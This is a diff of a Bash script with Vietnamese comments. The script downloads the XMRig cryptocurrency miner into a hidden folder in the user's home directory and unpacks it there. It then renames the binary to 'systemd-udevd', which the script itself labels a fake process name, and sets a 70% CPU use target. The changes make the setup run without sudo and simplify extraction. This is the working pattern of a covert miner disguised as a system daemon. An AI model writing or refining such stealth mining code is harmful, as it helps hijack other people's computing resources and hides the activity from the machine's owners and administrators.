@@ -7,6 +7,13 @@ FAKE_NAME="systemd-udevd" # Tên giả cho tiến trình
 XMRIG_URL="https://github.com/xmrig/xmrig/releases/download/v6.23.0/xmrig-6.23.0-linux-static-x64.tar.gz" # Đảm bảo đây là phiên bản đúng
 TARGET_CPU_PERCENT=70 # Mục tiêu sử dụng CPU (ví dụ: 70%)
 
+# --- Thư mục làm việc ---
+# Thay đổi thư mục làm việc để không cần sudo khi tạo/xoá file
+# Sẽ tạo một thư mục .xmrig_miner trong thư mục HOME của người dùng
+MINER_DIR="$HOME/.xmrig_miner"
+mkdir -p "$MINER_DIR" # Tạo thư mục nếu chưa có
+cd "$MINER_DIR" || { echo "[!] Không thể vào thư mục '$MINER_DIR'. Thoát."; exit 1; }
+
 # ==== Ước tính số luồng CPU dựa trên CPU hiện có ====
 # Lấy số luồng CPU vật lý
 TOTAL_CPU_THREADS=$(nproc --all)
@@ -25,11 +32,11 @@ else
 fi
 
 # ==== Dọn dẹp file cũ nếu có ====
-echo "[*] Đang dọn dẹp các file miner cũ (nếu có)..."
+echo "[*] Đang dọn dẹp các file miner cũ (nếu có) trong $MINER_DIR..."
 rm -f xmrig* miner.tar.gz "$FAKE_NAME"
 
 # ==== Tải XMRig về ====
-echo "[*] Đang tải XMRig từ $XMRIG_URL..."
+echo "[*] Đang tải XMRig từ $XMRIG_URL vào $MINER_DIR..."
 wget -q --show-progress -O miner.tar.gz "$XMRIG_URL"
 if [ ! -s miner.tar.gz ]; then
     echo "[!] Không tải được XMRig. Kiểm tra lại URL hoặc kết nối mạng. Thoát."
@@ -39,15 +46,12 @@ echo "[*] Tải XMRig hoàn tất."
 
 # ==== Giải nén ====
 echo "[*] Đang giải nén XMRig..."
-tar -xf miner.tar.gz
-FOLDER=$(tar -tf miner.tar.gz | head -1 | cut -f1 -d"/")
-
-if [ ! -d "$FOLDER" ]; then
-    echo "[!] Thư mục giải nén không tồn tại. Thoát."
+tar -xf miner.tar.gz --strip-components=1 # --strip-components=1 để giải nén trực tiếp vào thư mục hiện tại
+if [ ! -f xmrig ]; then # Kiểm tra xem file xmrig đã được giải nén chưa
+    echo "[!] File 'xmrig' không được tìm thấy sau khi giải nén. Thoát."
     exit 1
 fi
-cd "$FOLDER" || { echo "[!] Không vào được thư mục '$FOLDER'. Thoát."; exit 1; }
-echo "[*] Giải nén và vào thư mục thành công."
+echo "[*] Giải nén thành công."
 
 # ==== Đổi tên tiến trình & phân quyền ====
 echo "[*] Đổi tên 'xmrig' thành '$FAKE_NAME' và cấp quyền thực thi..."
